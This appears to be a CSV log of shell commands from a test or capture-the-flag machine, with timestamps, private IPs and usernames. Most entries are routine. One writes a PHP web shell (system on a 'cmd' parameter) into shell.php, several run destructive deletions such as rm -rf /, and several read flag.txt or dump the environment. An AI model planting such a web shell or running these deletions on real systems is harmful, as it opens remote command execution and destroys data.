2025-04-25 09:38:16,127.0.0.1,,ls
2025-04-25 09:38:21,127.0.0.1,,cat flag.txt
2025-04-25 09:39:33,127.0.0.1,,whoami
2025-04-25 09:39:44,127.0.0.1,,ls
2025-04-25 09:39:46,127.0.0.1,,pwd
2025-04-25 10:11:03,127.0.0.1,username,ls
2025-04-25 10:11:13,127.0.0.1,username,nano
2025-04-25 10:11:24,127.0.0.1,username,nano test.txt
2025-04-25 10:11:32,127.0.0.1,username,echo hello
2025-04-25 10:11:48,127.0.0.1,username,history
2025-04-25 10:12:40,127.0.0.1,username,"echo ""<?php system(\$_GET[\'cmd\']); ?>"" > shell.php"
2025-04-25 10:12:42,127.0.0.1,username,ls
2025-04-25 10:12:46,127.0.0.1,username,cat flag.txt
2025-04-25 10:12:58,127.0.0.1,username,env
2025-04-25 10:04:22,192.168.134.130,,ls
2025-04-25 10:04:28,192.168.134.130,,cat custardA.config
2025-04-25 10:04:31,192.168.134.130,,
2025-04-25 10:04:31,192.168.134.130,,
2025-04-25 10:04:32,192.168.134.130,,pwd
2025-04-25 10:42:26,192.168.134.130,,rm -rf /
2025-04-25 10:55:44,192.168.134.130,,ls
2025-04-25 10:55:50,192.168.134.130,,rm /
2025-04-25 10:57:35,192.168.134.130,,ls
2025-04-25 10:57:38,192.168.134.130,,rm /r
2025-04-25 10:57:46,192.168.134.130,,cat flag.txt
2025-04-25 10:57:49,192.168.134.130,,whoami
2025-04-25 10:59:11,192.168.134.130,,rm
2025-04-25 10:59:13,192.168.134.130,,rm /r
2025-04-25 10:59:17,192.168.134.130,,cat flag.txt
2025-04-25 22:52:52,192.168.134.139,,ls
2025-04-25 22:52:57,192.168.134.139,,ps
2025-04-25 22:53:07,192.168.134.139,,cat flag.txt
2025-04-25 22:53:11,192.168.134.139,,rm /
2025-04-25 23:13:52,192.168.134.139,,ls
2025-04-25 23:13:55,192.168.134.139,,pwd
2025-04-25 23:13:57,192.168.134.139,,whoami
2025-04-25 23:17:43,192.168.134.139,,ls
2025-04-25 23:17:46,192.168.134.139,,echo yoyokak
2025-04-25 23:21:48,192.168.134.139,,echo jajaf
2025-04-25 23:21:50,192.168.134.139,,ls
2025-04-25 23:25:33,192.168.134.139,root,ls
2025-04-25 23:25:35,192.168.134.139,root,echo ajfjafkj
2025-04-26 11:11:46,192.168.134.139,root,ls
2025-04-26 11:11:47,192.168.134.139,root,ls
2025-04-26 11:13:06,192.168.134.139,root,cat notes.txt
2025-04-26 11:15:41,192.168.134.139,root,ls
2025-04-26 11:15:42,192.168.134.139,root,ls
2025-04-26 11:15:42,192.168.134.139,root,ls
2025-04-26 11:15:43,192.168.134.139,root,ls
2025-04-26 11:15:47,192.168.134.139,root,cat notes.txt
2025-04-26 11:18:47,192.168.134.139,root,ls
2025-04-26 11:19:26,192.168.134.139,root,ls
2025-04-26 11:19:38,192.168.134.139,root,ls
2025-04-26 11:19:46,192.168.134.139,root,rm notes.txt
2025-04-26 11:19:48,192.168.134.139,root,ls
